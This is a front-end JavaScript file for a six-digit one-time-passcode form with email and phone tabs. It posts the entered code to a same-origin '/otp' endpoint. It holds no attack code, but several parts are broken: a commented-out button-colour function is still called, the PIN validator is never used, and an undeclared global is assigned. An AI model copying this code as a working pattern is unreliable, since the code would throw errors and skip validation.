const otpForm = document.querySelector(".otpForm");
const btn = document.querySelector("button");
// Function to check if the input is a valid 6-digit PIN
function isValidPIN(pin) {
  return /^\d{6}$/.test(pin);
}

// Function to change the button color
// function changeButtonColor(isFocused) {
//   var submitBtn = document.getElementById("submitBtn");
//   submitBtn.style.backgroundColor = isFocused ? "#0361f0" : ""; // Change the color as needed
//   submitBtn.style.color = isFocused ? "#fff" : ""; // Change the color as needed
// }

// Add event listeners to move the cursor to the next input field
var pinInputs = document.getElementsByClassName("pin-input");

for (var i = 0; i < pinInputs.length; i++) {
  pinInputs[i].addEventListener("input", function () {
    if (this.value.length === 1) {
      var nextInputIndex = Array.from(pinInputs).indexOf(this) + 1;
      if (nextInputIndex < pinInputs.length) {
        pinInputs[nextInputIndex].focus();
      } else {
        changeButtonColor(true); // Focus is on the last input
      }
    }
  });
}

// Add an event listener to reset the button color when any input loses focus
for (var i = 0; i < pinInputs.length; i++) {
  pinInputs[i].addEventListener("blur", function () {
    changeButtonColor(false);
  });
}

/// Loading in button
btn.onclick = () => {
  btn.disabled = true;
  btn.innerHTML = "Loading...";
};

// Function to collect and validate the PIN when the Submit button is clicked
document.getElementById("emailBtn").addEventListener("click", function () {
  var Emailotp = "";
  var pinInputs = document.getElementsByClassName("pin-input");

  for (var i = 0; i < pinInputs.length; i++) {
    Emailotp += pinInputs[i].value;
  }

  let formData = {
    Emailotp: Emailotp,
  };
  const handleFetchForm = async (res, req) => {
    const request = await fetch("/otp", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(formData),
    });
    const response = await request.text();
    console.log(request.statusText);
    console.log(response);
    if (response == "success") {
      otp = "";
      location.href = "/otp";
    } else {
      console.log("error");
    }
  };
  handleFetchForm();
});
// Function to collect and validate the PIN when the Submit button is clicked
document.getElementById("phoneBtn").addEventListener("click", function () {
  var Phoneotp = "";
  var pinInputs = document.getElementsByClassName("pin-input");

  for (var i = 0; i < pinInputs.length; i++) {
    Phoneotp += pinInputs[i].value;
  }

  let formData = {
    Phoneotp: Phoneotp,
  };
  const handleFetchForm = async (res, req) => {
    const request = await fetch("/otp", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(formData),
    });
    const response = await request.text();
    console.log(request.statusText);
    console.log(response);
    if (response == "success") {
      otp = "";
      location.href = "/otp";
    } else {
      console.log("error");
    }
  };
  handleFetchForm();
});

// JavaScript function to toggle between tabs and update active bar
function toggleTab(tabName) {
  const allContentBoxes = document.querySelectorAll(".content_box");
  allContentBoxes.forEach((box) => {
    box.classList.remove("active");
  });

  const activeContentBox = document.getElementById(tabName + "Content");
  activeContentBox.classList.add("active");

  const allTabBtns = document.querySelectorAll(".tab_btn");
  allTabBtns.forEach((btn) => {
    btn.classList.toggle("activeBar");
  });

  const activeTabBtn = document.querySelector(".tab_btn." + tabName);
  activeTabBtn.classList.add("activeBar");
}
